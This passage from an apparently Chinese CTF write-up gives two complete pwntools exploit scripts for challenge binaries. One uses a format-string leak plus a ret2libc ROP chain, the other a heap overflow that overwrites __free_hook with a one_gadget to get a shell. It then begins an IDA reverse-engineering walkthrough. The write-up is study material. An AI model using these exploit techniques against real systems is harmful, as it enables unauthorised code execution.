class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class="line">Locale = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> Locale == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;154.64.254.169&quot;</span>,<span class="number">33185</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;I would like to know your complete PTT (Potential Value), would it be convenient for you to tell me?&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;11.0&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;7. Exit the system\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;problems if you vote, anyway, it&#x27;s useless to vote (=_=!!!)&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;AAAAAAAA%23$p&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;7. Exit the system&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;AAAAAAAA&quot;</span>)</span><br><span class="line">    main_146F = io.recv(<span class="number">10</span>)</span><br><span class="line">    main_addr = <span class="built_in">hex</span>(<span class="built_in">int</span>(main_146F,<span class="number">16</span>) - <span class="number">456</span>)</span><br><span class="line">    log.success(<span class="string">&quot;main_146F = &quot;</span> + <span class="built_in">str</span>(main_146F.decode()))</span><br><span class="line">    log.success(<span class="string">&quot;main_addr = &quot;</span> + <span class="built_in">str</span>(main_addr))</span><br><span class="line">    </span><br><span class="line">    offset = <span class="number">0x4c</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;7. Exit the system\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;problems if you vote, anyway, it&#x27;s useless to vote (=_=!!!)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    main_addr = <span class="built_in">int</span>(main_addr,<span class="number">16</span>)</span><br><span class="line">    backdoor = main_addr + <span class="number">0x1DDE</span> - <span class="number">0x12A7</span></span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * offset + p32(backdoor)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;7. Exit the system\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;So?How are you?&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;g01den\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;plz input the count of your advice\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    base = main_addr - elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">    puts_plt = base + elf.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    puts_got = base + elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;main_add = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(main_addr)))</span><br><span class="line">    log.success(<span class="string">&quot;puts_plt = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(puts_plt)))</span><br><span class="line">    log.success(<span class="string">&quot;elf_base = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(base)))</span><br><span class="line">    log.success(<span class="string">&quot;puts_got = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(puts_got)))</span><br><span class="line">    </span><br><span class="line">    offset = <span class="number">0x13c</span></span><br><span class="line">    ret = base + <span class="number">0x100e</span></span><br><span class="line">    <span class="comment"># gdb.attach(io)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    global_offset_table_addr = base + <span class="number">0x5000</span><span class="comment">#0x4fa0</span></span><br><span class="line">    log.success(<span class="string">&quot;global_offset_table_addr = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(global_offset_table_addr)))</span><br><span class="line">    payload1 = (offset -<span class="number">8</span>) * <span class="string">b&quot;a&quot;</span> + p32(global_offset_table_addr) + p32(global_offset_table_addr) + p32(ret) + p32(puts_plt) + p32(backdoor) + p32(puts_got)</span><br><span class="line">    <span class="comment"># payload1 = offset * b&quot;a&quot; + p32(ret) + p32(main_addr)</span></span><br><span class="line">    <span class="comment"># payload1 = offset * b&quot;a&quot; + p32(ret) + p32(main_addr) </span></span><br><span class="line">    io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">    puts_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">    log.success(<span class="string">&quot;puts_addr = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(puts_addr)))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;libc_base = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;system_addr = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    io.recvuntil(<span class="string">b&quot;So?How are you?\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;g01den\x00&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    io.recvuntil(<span class="string">b&quot;plz input the count of your advice\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">    log.success(<span class="string">&quot;binsh_addr = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(binsh_addr)))</span><br><span class="line">    payload2 = (offset -<span class="number">8</span>) * <span class="string">b&quot;a&quot;</span> + p32(global_offset_table_addr) + p32(global_offset_table_addr) + p32(ret)</span><br><span class="line">    payload2 += p32(system_addr) + p32(binsh_addr) + p32(binsh_addr) + p32(binsh_addr)</span><br><span class="line">    </span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>​这里 payload2 的 <code>p32(global_offset_table_addr) + p32(global_offset_table_addr)</code>  有点儿问题，不是我的 exp 的问题，是我最开始本地调题目的时候出现的问题，我发现它这里如果不泄露这个地址的话就打不通，但为啥现在不需要这个都能出，有点过于随缘了，如果不加上这个地址不通的话， 那就考虑 gdb 调一下看看是否这里缺失了什么，或者寄存器之类的问题（补充，这里出现问题是因为再 call puts 的 plt 的时候，出现了问题，有个存在 ebp-4 的地址给 mov 到了 ebx 寄存器中，同时，存在 jmp ebp+XX 相关代码，动调的时候，发现报错地址是 aaaa，所以改成 <code>p32(global_offset_table_addr) + p32(global_offset_table_addr)</code>  就能打通）。</p><h3 id="arcaea_sorting_revenge"><a class="markdownIt-Anchor" href="#arcaea_sorting_revenge">#</a> Arcaea_Sorting_Revenge：</h3><p>​似乎出了个板子题，不过，我也算是尽力了吧，堆这玩意儿是真的难。</p><p>​程序做了个简单的存储功能，arcaea 存储分数并输出的功能，删除功能里会将 bss 段里的当前指针置零，但是歌曲信息那个 chunk 里面，指向 description 的指针没有置零，edit 修改了输入的长度，但是没有重新 malloc 新的空间，没有检测大小，存在堆溢出，增加功能里一次 malloc 了两次 chunk，第二次可以控制大小。</p><p>​首先增加三次书，每次都是，控制 size 大小为 0x91，保证 chunk 在被 free 的时候能进 unsortedbin，free 掉编号为 1 的这个音乐，然后重新建一个歌曲，为了让 chunk 里有 unsortedbin 里的数据，也就是 fd 或者 bk 指针，因为 unsortedbin 目前只有一个 chunk，所以 fd，bk 指针均指向 main_arena，可以用来 leak 掉 libc 地址，重新 add 了一个之后，编号依旧为 1，然后写入的 content 为八个字节，不要写入其他内容，之后 show 可以 leak 出 libc 地址，之后为了 leak 堆的地址，我 free 了两次，但是实际上并不需要这么做，之后就是利用 edit 的溢出功能，在堆上修改 chunk，达成伪造，伪造指针，指向任意地址，这里指向 <code>__free_hook</code> ，然后 edit 修改 <code>__free_hook</code>  为 <code>one_gadget</code>  的地址，然后进行 getshell。</p><p>​算是个比较板子的堆题吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;154.64.254.169&quot;,33215)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,rating,score,descSize,desc</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s name:&quot;</span>,name)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s rating:&quot;</span>,<span class="built_in">str</span>(rating))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s score:&quot;</span>,<span class="built_in">str</span>(score))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input descript&#x27;s max size:&quot;</span>,<span class="built_in">str</span>(descSize))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s descript:&quot;</span>,desc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input index you want to delete(index from 0) :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,descSize,desc</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input index you want to delete(index from 0) :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input max size you want to change to:&quot;</span>,<span class="built_in">str</span>(descSize))</span><br><span class="line">io.sendafter(<span class="string">b&quot;plz input description:&quot;</span>,desc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;plz enter your username:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;g01den&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;testify&quot;</span>,<span class="number">12</span>,<span class="number">10002221</span>,<span class="number">128</span>,<span class="string">b&quot;hardhard&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;bbbb&quot;</span>,<span class="number">12</span>,<span class="number">10002221</span>,<span class="number">128</span>,<span class="string">b&quot;what&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;cccc&quot;</span>,<span class="number">12</span>,<span class="number">10002221</span>,<span class="number">128</span>,<span class="string">b&quot;nani&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;######################leaking libc address########################3&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s name:&quot;</span>,<span class="string">b&quot;dddd&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s rating:&quot;</span>,<span class="built_in">str</span>(<span class="number">12</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s score:&quot;</span>,<span class="built_in">str</span>(<span class="number">10002221</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input descript&#x27;s max size:&quot;</span>,<span class="built_in">str</span>(<span class="number">128</span>))</span><br><span class="line">io.sendafter(<span class="string">b&quot;plz input music&#x27;s descript:&quot;</span>,<span class="string">b&quot;dddddddd&quot;</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;dddddddd&quot;</span>)</span><br><span class="line"><span class="comment"># main_arena = u64(io.recvuntil(b&quot;\x7f&quot;)[:-6].ljust(8,b&quot;\x00&quot;))</span></span><br><span class="line"><span class="comment"># main_arena = u64(io.recvuntil(b&quot;\x7f&quot;).ljust(8,b&quot;\x00&quot;))</span></span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;main_arena =&gt; &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(main_arena)))</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - <span class="number">0x3c4b78</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base =&gt; &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;eeee&quot;</span>,<span class="number">12</span>,<span class="number">10002221</span>,<span class="number">128</span>,<span class="string">b&quot;eeeeeeee&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;######################leaking chunk6 address########################3&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s name:&quot;</span>,<span class="string">b&quot;ffff&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s rating:&quot;</span>,<span class="built_in">str</span>(<span class="number">12</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s score:&quot;</span>,<span class="built_in">str</span>(<span class="number">10002221</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input descript&#x27;s max size:&quot;</span>,<span class="built_in">str</span>(<span class="number">128</span>))</span><br><span class="line">io.sendafter(<span class="string">b&quot;plz input music&#x27;s descript:&quot;</span>,<span class="string">b&quot;ffffffff&quot;</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;ffffffff&quot;</span>)</span><br><span class="line">chunk = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">chunk_basee = chunk - <span class="number">0x210</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(chunk))</span><br><span class="line">log.success(<span class="string">&quot;chunk_basee =&gt; &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(chunk_basee)))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">target_chunk = chunk_basee + <span class="number">0x210</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x80</span> + p64(<span class="number">0x90</span>) + p64(<span class="number">0x51</span>) + <span class="string">b&quot;b&quot;</span> * <span class="number">0x30</span> + p64(<span class="number">1</span>) + p64(<span class="number">10002221</span>) + p64(free_hook)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x200</span>,payload)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4527a</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x100</span>,p64(one_gadget))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>注：别问为啥没有剩下两个 pwn 题的 wp，因为我也不会，并且短时间内学不会</strong></p><h2 id="re"><a class="markdownIt-Anchor" href="#re">#</a> Re：</h2><h3 id="babyre"><a class="markdownIt-Anchor" href="#babyre">#</a> babyre：</h3><p>​无壳。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">start</span><span class="params">(__int64 a1, __int64 a2, <span class="type">void</span> (*a3)(<span class="type">void</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-8h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *retaddr; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = v5;</span><br><span class="line">  v5 = v3;</span><br><span class="line">  _libc_start_main(main, v4, &amp;retaddr, <span class="number">0LL</span>, <span class="number">0LL</span>, a3, &amp;v5);</span><br><span class="line">  __halt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​是 Linux 编译的，进 main 里看看</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  _BYTE v6[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-A0h] BYREF</span></span><br><span class="line">  _BYTE v7[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-80h] BYREF</span></span><br><span class="line">  _BYTE v8[<span class="number">32</span>]; <span class="comment">// [rsp+40h] [rbp-60h] BYREF</span></span><br><span class="line">  _BYTE v9[<span class="number">40</span>]; <span class="comment">// [rsp+60h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+88h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v6, a2, a3);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v7, a2, v3);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v8, a2, v4);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, &amp;unk_21AD);</span><br><span class="line">  std::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="type">char</span>&gt;(&amp;std::cin, v6);</span><br><span class="line">  <span class="built_in">sub_147E</span>();</span><br><span class="line">  <span class="built_in">sub_1558</span>();</span><br><span class="line">  <span class="built_in">sub_13A9</span>(v8, v6);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(v7, v6);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v9, v6);</span><br><span class="line">  <span class="built_in">sub_1920</span>(v9, v7);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v9);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v9, v7);</span><br><span class="line">  <span class="built_in">sub_17A7</span>(v9);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v9);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v8);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v7);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​C++ 逆向，代码不复杂，Shift+F12 找关键字符串，找到了这个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.rodata:00000000000021BF aWrongValue     db &#x27;Wrong Value&#x27;,0      ; DATA XREF: sub_17A7+110↑o</span><br><span class="line">.rodata:00000000000021CB aCurruntValue   db &#x27;Currunt Value&#x27;,0    ; DATA XREF: sub_17A7+149↑o</span><br></pre></td></tr></table></figure><p>​跟踪一下，这个函数调用了：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">sub_17A7</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-1B0h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-1ACh]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+18h] [rbp-1A8h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-1A4h]</span></span><br><span class="line">  _DWORD v6[<span class="number">102</span>]; <span class="comment">// [rsp+20h] [rbp-1A0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+1B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = std::string::<span class="built_in">length</span>(a1);</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">0x190</span>uLL);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">    v6[i] = *(<span class="type">char</span> *)std::string::<span class="keyword">operator</span>[](a1, i) ^ (i / <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v5; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6[j] != dword_4020[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="number">1</span>;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Wrong Value&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Currunt Value&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v7 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这里有个异或运算，逐个比较，推测这里就是目的函数，返回 main 函数，传参是 v9，盯着 v9，从下往上看，找到门路：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 